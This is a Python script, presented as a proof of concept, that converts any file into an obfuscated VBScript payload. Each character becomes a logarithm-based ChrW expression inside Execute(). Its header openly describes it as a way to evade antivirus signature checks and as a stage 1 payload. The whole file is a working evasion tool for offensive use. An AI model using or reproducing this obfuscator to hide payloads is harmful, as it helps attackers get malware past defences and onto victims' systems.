'''
Author: Michael Wurner
Date: June 20th 2019
Description: This script is a proof of concept. It takes any file and converts all characters to unicode.
	     Algorithms are generated using vbscript log() function to obfuscate the text. This is a good method of 
	     evading signature checks and can be utilized with or as a stage 1 payload.
'''

#!/usr/bin/python3

import sys

#Declare global variables
inputfile = open(sys.argv[1],'r+')
outputfile = open(sys.argv[2],'a+')
unicodefile = open('unicode.txt','a+')
infile = inputfile.read()

# Function that converts all characters in a text file to unicode and writes to a "unicode" file.
def Convert_to_Unicode():
	global unicodefile
	global infile
	global outputfile
	for i in infile:							#As Unicode goes up to 4 bytes all output needs to be standard length for later conversion.
		if len(str(ord(i))) == 2:
			unicodefile.write("00"+str(ord(i))) #Ord converts character to Unicode value. Writing to file it has to be string.
		elif len(str(ord(i))) == 3:
			unicodefile.write("0"+str(ord(i)))
		else:
			unicodefile.write(str(ord(i)))
		f = unicodefile.read()
	print("[+] Unicode Conversion Complete")
	unicodefile.close()
	Obfuscate_File()

# Takes unicode file and outputs a VBScript that executes Wide Characters with logarithmic values
def Obfuscate_File():
	global outputfile
	iterate = 0
	unicodefile = open('unicode.txt','r+')
	f = unicodefile.read()
	print("[+] Creating final obfuscated payload")
	outputfile.write("Execute (")
	
	for x1,x2,x3,x4 in zip(f[::4],f[1::4],f[2::4],f[3::4]):  #Iterates through 4 bytes at a time
		uni = (x1 + x2 + x3 + x4).lstrip("0")  				 #Strips all leading zeros so only unicode value remains
		x = (int(uni) - .418685571719)						 #Arbiturary subtraction so final value needs to be rounded up to know true character
		y = 'ChrW(log(1.8) - log(1.4) + ' + str(x) +") "     #Arbiturary Log values, just needs to be enough to force rounding up value.
		outputfile.write(y)
		iterate +=4
		if iterate < len(f):
			outputfile.write('+ ')

	outputfile.write(")")

def main(self):
	print("[+] Converting " + sys.argv[1] + " to Unicode.")
	Convert_to_Unicode()
	print("[+] Output file " + sys.argv[2] + " has been created.")

	inputfile.close()
	outputfile.close()
	unicodefile.close()

if __name__ == "__main__":
	main(sys.argv[1:])
